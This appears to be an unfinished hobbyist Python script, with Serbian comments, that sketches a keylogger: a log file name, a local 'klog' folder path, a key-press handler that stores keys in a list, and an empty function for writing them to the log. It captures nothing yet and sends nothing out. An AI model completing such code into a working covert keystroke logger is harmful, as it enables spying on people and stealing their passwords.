# Author: Aleksa

# PREBACITI U CODING FOLDER

import os
import time

keys = "log.txt"
path = "C:\\Users\\Korisnik\\Official\\Desktop\\desktop\\za moj pc\\klog"

count = 0
keys = []

def on_press(key):

  global keys, count
  
  keys.append(key)
  count += 1

def write_to_log(keys):
  pass
